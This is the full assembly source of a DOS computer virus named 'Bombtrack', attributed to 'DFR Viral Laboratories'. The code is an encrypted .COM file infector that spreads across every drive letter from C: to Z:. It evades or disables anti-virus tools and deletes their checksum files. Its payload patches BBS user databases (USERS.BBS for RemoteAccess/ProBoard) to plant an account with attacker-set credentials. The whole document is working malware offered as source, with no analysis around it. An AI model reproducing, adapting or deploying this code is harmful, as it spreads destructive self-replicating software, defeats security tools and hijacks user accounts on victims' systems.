;
; Virus: Rage Against The Machine - Bombtrack
; Author: Saruman / DFR Viral Laboratories
; Completed: 9x-xx-xx
;
; Specs: ENCRYPTED NON-RES .COM INFECTOR
;        ANTI-VIRUS CHECKSUM-FILE REMOVAL,
;        MULTIPLE-DRIVE INFECTION, BBS-HACKING PAYLOAD
;
; TODO:
;  Crashes on exit, sometimes - why?
;  EXE infection (skip AV files & RA.EXE)
;
; Size: 1024 bytes
;
; Scanstring: 15 bytes (2 wildcard bytes)
;
.model tiny
.code
.radix 16
.286

ReadOnly       equ 1
Hidden         equ 2
SysFile        equ 4
VolumeID       equ 8
Directory      equ 10
Archive        equ 20
AnyFile        equ 3F

ReservedStack  equ 100
VirusDiskSize  equ END_OF_VIRUS_DISK - MAIN - 3
VirusMemSize   equ END_OF_VIRUS_MEM  - MAIN - 3
EntryOfs       equ STARTCODE - MAIN - 3

TunnelINT      equ 21h

SizeMIN        equ 2
SizeMAX        equ 065435d-VirusMemSize-ReservedStack
DisinfectCount equ 3                         ; disinfect host after X infections
MaxInfectCount equ 8                         ; max files to infect each execution

         org 100

main:
         jmp startcode
dummy    db 0                               ; jmp short<>jmp near (2 vs 3 bytes)

endecrypt:
         mov  cx,(END_OF_VIRUS_DISK-encryption_start-2)/2
         mov  si,offset encryption_start
cryptloop:
         db   81h,32h       ; xor word ptr[bp+di],
cryptkey:db   0,0
         lodsw
         loop cryptloop
         ret

;==========================================================================
; ** Virus Entry Point **
;==========================================================================
startcode:
         mov  bp,0000h
         call endecrypt

;==========================================================================
; The encrypted virus code starts here, first we play around a little
; and initialize some variables...
;==========================================================================
encryption_start:
         push sp                           ; save SP for host re-entry
         mov  ax,0fa01
         mov  dx,05945h
         int  16h                          ; defeat old VSAFE and TBCLEAN

         mov  ax,0ff0fh
         int  21h
         cmp  ax,101h                      ; Is VirexPC/Flushot in memory?
         jne  proceed1
         jmp  megaexit                     ; Yepp...
proceed1:
         lea  dx,bp+exit                   ; Setup critical error handler
         mov  ax,2524h
         int  TunnelINT

         mov  di,100h                      ; Recreate header
         lea  si,bp+orgheader
         cld
         movsw
         movsb                             ; move from SI => DI (2+1 bytes)

         mov ah,1ah
         lea dx,bp+dta
         int TunnelINT                     ; Setup DTA area

         call payload                      ; ** Do the payload stuff

         lea  dx,bp+TBdriver
         call findfirst                    ; Check if TBFILXXX is loaded.
         jc   no_tbav_present              ; No?
         jmp  megaexit                     ; Yes! .. Bye!

;==========================================================================
; Start the process of finding new hosts...
;==========================================================================
no_tbav_present:

; Copy the write_virus code to the heap, outside the encryption.
         lea  di,bp+buffer
         lea  si,bp+write_virus
         mov  cx,end_write_virus - write_virus
         rep  movsb                         ; movsW in "release" ver.

         mov  byte ptr [bp+infected],0
         mov  ah,19h
         int  TunnelINT
         mov  byte ptr [bp+olddrive],al     ; store starting drive
         mov  byte ptr [bp+drive],2         ; start on C:

NextDrive:
         inc  byte ptr [bp+drive]
         mov  dl,byte ptr [bp+drive]
         cmp  dl,027d
         jne  proceed2
m_exit:  jmp  exit                          ; all done!
proceed2:
         mov  ah,36h
         int  TunnelINT                     ; get free space
         cmp  ax,0ffffh
         je   nextdrive                     ; loop if NOT valid drive
           
         mov  ah,64d
         add  ah,byte ptr[bp+drive]
         lea  si,bp+wildcard
         mov  byte ptr [si],ah              ; fix 'X:*.COM'

         mov  dx,si
;         mov  cx,anyfile-VolumeID-SysFile-Directory
         call findfirst
         jc   nextdrive                     ; ... not found, next drive.

         mov  dl,byte ptr [bp+drive]
         dec  dl
         mov  ah,0eh
         int  TunnelINT                     ; Chdir to the correct drive
checkit: 
; Fungerar detta?!?!
         cmp  word ptr[bp+file_size],SizeMAX
         ja   next_victim                   ; Too big?

         cmp  word ptr[bp+file_size+2],0
         jne  next_victim

         cmp  word ptr[bp+file_size],SizeMIN
         jb   next_victim

         call process_victim                ; INFECT!

next_victim:
         cmp  byte ptr [bp+infected],MaxInfectCount
         jge  m_exit                        ; Exit if max infections reached.

         mov  ah,4fh
         int  TunnelINT                     ; Find Next
         jnc  checkit                       ; Aha! Another host found..
         jmp  nextdrive                     ; All done on this drive, next!

;==========================================================================
; This procedure will infect the file pointed to by the DTA.filename
;==========================================================================
process_victim:
         mov  ax,4301h
         lea  dx,bp+filename
         mov  cx,0                          ; -not- xor cx,cx => z-flag probl.
         int  TunnelINT                     ; clear file-attributes
         jnz  okidoki                       ; BEFORE OPEN! = IMPORTANT!
close_skip_file:
         jmp  skip_file

okidoki:
         mov  ax,3d02
         lea  dx,bp+filename
         int  TunnelINT                     ; Open file r/w
;         jz   close_skip_file               ; **NEW = FUCK UP!!

         mov  bp+file,ax                    ; Save the file handle
         xchg ax,bx
         mov  ah,3f
         mov  cx,3
         lea  dx,bp+orgheader
         int  TunnelINT                     ; Read first 3 bytes & store them

         cmp  word ptr [bp+orgheader],'ZM'  ; Check renamed EXE
         je   close_skip_file

         mov  ax,word ptr[bp+file_size]
         sub  ax,VirusDiskSize-EntryOFS+3   ; *********
         cmp  word ptr [bp+orgheader+1],ax
         je   skip_file                     ; is already infected?

;==========================================================================
; Erase stupid checksum files.
;==========================================================================
         lea  dx,bp+kill_tbav
         call kill_ds_dx
         lea  dx,bp+kill_msav               ; add dx,<magiskt>
         call kill_ds_dx

;=====================
; Do infect.
;=====================
         mov  ax,word ptr [bp+file_size]    ; Calculate jmp-header
         sub  ax,3
         mov  word ptr [bp+startcode+1],ax  ; fix MOV BP,<value> at start ...
          
         add  ax,ENTRYOFS
         mov  byte ptr [BP+HDRBUF],0E9h     ; E9 = opcode for JMP
         mov  word ptr [BP+HDRBUF+1],ax     ; ax = filesize+offset into virus ******

         mov  ax,4200
         cwd                                ; xor dx,dx
         xor  cx,cx
         int  TunnelINT                     ; Seek to beginning of file
         
         mov  ah,40
         mov  cl,3                          ; cx,3 = 1 byte saved
         lea  dx,BP+HDRBUF
         int  TunnelINT                     ; Write JMP to header
;        jc   skip_file

         mov  ax,4202
         cwd                                ; xor dx,dx
         xor  cx,cx
         int  TunnelINT                     ; Seek to end of file

         inc  byte ptr [bp+infected]
         inc  word ptr [bp+total_infected]
         call initSEED
         call buffer

skip_file:
         mov  ax,5701
         mov  bx,BP+FILE
         mov  cx,word ptr [bp+file_time]
         mov  dx,word ptr [bp+file_date]
         int  TunnelINT                     ; Restore old datestamp

         mov  ah,3e
         int  TunnelINT                     ; Close file

         lea  dx,bp+filename
         mov  ax,4301
         xor  ch,ch
         mov  cl,byte ptr [bp+attribute]
         int  TunnelINT                     ; Restore old attributes
         ret

;===========================================================================
; Initialize random seed
;===========================================================================
initSEED:
         cli
         mov  al,0                          ; latch timer 0
         out  43,al
         in   al,40h                        ; read seed from 8253 count (16 bits)
         mov  ah,al                         ; which changes 1,193,180 t/sec
         in   al,40h
         sti
         and  ax,ax                         ; check for zero
         jnz  save
         inc  ax                            ; cannot use 0, use 1 instead.
save:    mov  word ptr [bp+cryptkey],ax
         ret

;===========================================================================
; Kill file whose name is pointed to by DS:DX
;===========================================================================
kill_ds_dx:
         xor  cx,cx
         mov  ax,4301h
         int  TunnelINT                     ; Clean the file attribs
         jc   damned
         mov  ah,41h
         int  TunnelINT                     ; delete file
damned:  ret


findfirst:                                  ; (dx=filename. Return Z flag)
         mov  cx,anyfile-VolumeID-SysFile-Directory
         mov  ah,4eh
         int  TunnelINT
         ret

;==========================================================================
; Disinfect file. Must be able to optimize this?
;==========================================================================
do_disinfect:
         push es
         mov  si,word ptr[ds:02Ch]          ; Get environment seg from PSP
         mov  es,si
         xor  di,di
         mov  ax,0001h                      ; Search for end of environment
         cld
scanENV:
         scasw
         jne  scanENV                       ; Do search
         xor  al,al
scanEND: scasb
         jnz  scanEND
         std
         mov  al,'\'
scanSLASH:
         scasb
         jnz  scanSLASH
         inc  di
         inc  di
         mov  dx,di
         push es
         pop  ds
         call findfirst                     ; Setup DTA-record (filesize)
         mov  ax,3d01
         int  TunnelINT                     ; Open file write-only
         push cs
         pop  ds
         xchg ax,bx                         ; mov  bx,ax
         mov  ah,40h
         mov  cx,3
         mov  dx,100h
         int  TunnelINT                     ; Write original header
         mov  ax,4200h
         xor  cx,cx
         mov  dx,word ptr [bp+file_size]
         sub  dx,VirusDiskSize
         int  TunnelINT                     ; Seek to start of virus.
         mov  ah,40h
;         xor  cx,cx
         int  TunnelINT                     ; Truncate
         mov  ah,3eh
         int  TunnelINT                     ; Close file
         pop  es
         cld
         ret



scan_next_env:
         mov  cx,0ffff
         xor  ax,ax
         repne scasb                             ; find zero
         not  cx
         cmp  es:[di],00100h                     ; is last env-var?
         ret

;==============================================================
; Payload. Patch USERS.BBS in RA and PROBOARD
;==============================================================
payload:
         push ds
         mov  si,word ptr ds:[02Ch] ; Get environment seg from PSP
         mov  es,si
         xor  di,di
         cld
         mov  bx,3                               ; 'RA=' length
scan_RA:
         cmp  word ptr es:[di],'AR'              ; env 'RA'
         jne  scan_n1
         cmp  byte ptr es:[di+2],'='
         je   scan_foundit
scan_n1: call scan_next_env
         jne  scan_RA                            ; check another env-var
         mov  bx,9                               ; 'PROBOARD=' length
         xor  di,di
scan_PB: cmp  word ptr es:[di+2],'BO'              ; env 'PROBOARD='
         jne  scan_n2
         cmp  word ptr es:[di+7],'=D'
         je   scan_foundit
scan_n2: call scan_next_env
         jne  scan_PB                           ; check another env-var

         pop  es                                ; fix ES from push'ed DS
         ret                                    ; RA= was not found

scan_foundit:
         push di
;;         mov  cx,0ffffh
;;         repne scasb
;;         not  cx
;;         sub  cx,4                               ; Skip 'RA=' + fixup
         pop  si
         ; let's copy the path into buffer
         push es                                 ; these swap DS and ES
         push ds
         pop  es
         pop  ds
         add  si,bx                              ; skip the '<var>=' part
         lea  di,bp+buffer
copy_next:                                       ; copy until ZT found
         lodsb
         or   al,al
         je   copy_proceed1
         stosb
         jmp  copy_next
copy_proceed1:
;;         rep  movsb
         pop  ds                                 ; restore DS

         cmp  byte ptr [di-1],'\'               ; check for trailing slash
         jne  slashcheck1                       ; in the environment var
         dec  di
slashcheck1:

         lea  si,bp+RACONFIG
         mov  cx,0Bh
         rep  movsb                              ; add '\CONFIG.RA',0

         mov  ax,3D00
         lea  dx,bp+buffer                        ; %ra%'\CONFIG.RA',0
         int  TunnelINT
         jc   doret                              ; Could not OPEN file.
         mov  bx,ax                              ; Filehandle goes into BX

         mov  ah,3F
         lea  dx,bp+buffer
         mov  cx,2
         int  TunnelINT
         jc   user_exit                          ; Could not READ from file.

         cmp  word ptr [buffer+bp],0201
         jb   user_exit                          ; Is version >2.01

         mov  ax,4200
         xor  cx,cx
         mov  dx,3E3
         int  TunnelINT                          ; Seek to MSGPATH offset

         mov  ah,3F
         lea  dx,bp+buffer
         mov  cx,061d                            ; lengthbyte+60 chars
         int  TunnelINT

         lea  si,bp+buffer
         xor  ah,ah
         lodsb                                   ; get lengthbyte
         mov  di,si
         add  di,ax                              ; goto end of path
         cmp  byte ptr [di-1],'\'
         jne  user_proceed1                      ; trailing slash if needed
         dec  di
user_proceed1:
         lea  si,bp+rauser
         mov  cx,0A
         rep  movsb                              ; complete the USERS.BBS pfn

         jmp  payload_step2

user_exit:
         mov  ah,3E
         int  TunnelINT                          ; close file (BX=handle)
doret:   ret                                     ; couldn't complete. Return
payload_step2:
         mov  ax,3D02
         lea  dx,bp+buffer                        ; USERS.BBS pfn
         inc  dx
         int  TunnelINT
         jc   doret                              ; Could not OPEN file
         mov  bx,ax                              ; Filehandle goes into BX

         mov  ah,3F
         lea  dx,bp+buffer
         mov  cx,USERSrecord
         int  TunnelINT
         jc   user_exit                          ; Could not READ from file.

         mov  ax,4200
         xor  cx,cx
         mov  dx,USERSrecord*022d
         int  TunnelINT                          ; Seek to user 22

         lea  di,bp+buffer
         lea  si,bp+u_name
         mov  cx,u_name_len+1
         rep  movsb                              ; patch username

         add  di,0109 - u_name_len
         lea  si,bp+u_handle
         mov  cx,u_handle_len+1
         rep  movsb                              ; patch handle

         add  di,075 - u_handle_len
         lea  si,bp+u_passwd
         mov  cx,4
         rep  movsb                              ; patch password

         lea  si,bp+u_birthdate
         add  di,0202-5
         mov  cx,8
         rep  movsb                              ; patch birthdate

         mov  ah,40
         lea  dx,bp+buffer
         mov  cx,USERSrecord
         int  TunnelINT                          ; write ds:dx to file

         jmp  user_exit                          ; close and exit

;
; En/Decryptor - This is the code that is copied.
;
write_virus:
         lea  bx,bp+endecrypt
         push bx                            ; store adress of decryptor
         call bx                            ; call encryptor
         mov  ah,40
         lea  dx,bp+endecrypt               ; ** MAIN
         mov  bx,bp+file
         mov  cx,VirusDiskSize
         int  TunnelINT                     ; write virus body
         pop  bx                            ; retrive adress of encryptor
         call bx                            ; decrypt code again
         ret

;==========================================================================
; Virus Closedown code
;==========================================================================
exit:
         mov  ah,0eh
         mov  dl,byte ptr [bp+olddrive]
         int  TunnelINT                     ; Chdir back to starting drive

         cmp  byte ptr [bp+infected],DisinfectCOUNT
         jl   megaexit
         call do_disinfect

megaexit:
; Copy the last bit of the exit-code onto the heap and execute from there
; This way we can erase the memory image of the virus before returning to
; it's host.
         lea  di,bp+buffer
         lea  si,bp+clean_and_exit
         mov  cx,(end_write_virus - clean_and_exit)
         push di
         cld
         rep  movsb                         ; movsW in "release" ver.
         pop  bx
         jmp  bx

clean_and_exit:
         mov  ah,1ah                        ; ReSet DTA address ...
         mov  dx,80h                        ; ... to default DTA
         int  TunnelINT
         shl  dx,1                          ; 80*2h = 100h return adress
         pop  sp                            ; mov  sp,0FFFEh
         push dx
         xor  ax,ax                         ; Reset all regs
         xor  bx,bx
         cwd                                ; dx = 0 if ax<$8000
         lea  di,bp+endecrypt
         mov  cx,buffer - main + (cleaner_ofs-clean_and_exit) - 3
cleaner_ofs:
         rep  stosb                         ; Remove virus image from memory.
;         xor  cx,cx                        ; CX _is_ zero after countdown.
         xor  si,si
         xor  di,di
         xor  bp,bp
         ret                                ; Return to 100h

end_write_virus:

newINT1:   db 0eah,0,0,0ffh,0ffh            ; Call FAR [FFFF:0000]

; data used by the payload
;
 rauser     db '\USERS.BBS',0
 raconfig   db '\CONFIG.RA',0
 USERSrecord  equ 01016d
 u_name_len   equ 0C
 u_handle_len equ 05
 u_name      db u_name_len,'Dan Sandberg'   ; offset 0000
 u_handle    db u_handle_len,'Jesus'        ; offset 010A
 u_passwd    dd 01965EE0Ah ; 'satan'        ; offset 017F ;; diff 075
 u_birthdate db '01-01-70'                  ; offset 0381 ;; diff 202

 orgheader   db 0c3h,0h,0h                  ; Terminate for 1:st generation
 wildcard:   db 0,':*.!!!',0
 kill_tbav   db 'anti-vir.dat', 0
 kill_msav   db 'chklist.ms', 0
 tbdriver    db 'TBFILXXX',0

             db '[RATM.Bombtrack]'

total_infected dw 0

END_OF_VIRUS_DISK:

DTA:         db 021d dup (?)                ; crap
 attribute   db ?                           ; attribute
 file_time   db 02d dup (?)                 ; file's time stamp
 file_date   db 02d dup (?)                 ; file's date stamp
 file_size   db 04d dup (?)                 ; file's size
 filename    db 013d dup (?)                ; filename

hdrbuf       db ?,?,?
file         dw ?
drive        db ?
olddrive     db ?
infected     db ?

buffer:      db USERSrecord dup (?)

END_OF_VIRUS_MEM:

end     main
